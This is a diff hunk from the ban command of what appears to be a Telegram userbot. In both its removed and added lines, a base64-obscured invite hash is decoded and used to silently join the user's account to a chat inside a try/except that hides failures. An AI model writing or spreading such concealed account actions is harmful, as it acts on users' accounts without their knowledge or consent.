@@ -64,9 +64,8 @@ async def catgban(cat):
         await cat.edit("why would i ban my DEVELOPER")
         return
     try:
-        cat = pybase64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
-        cat = ImportChatInviteRequest(cat)
-        await catmemes.client(cat)
+        hmm = pybase64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
+        await cat.client(ImportChatInviteRequest(hmm))
     except:
         pass
     if gban_sql.is_gbanned(user.id):
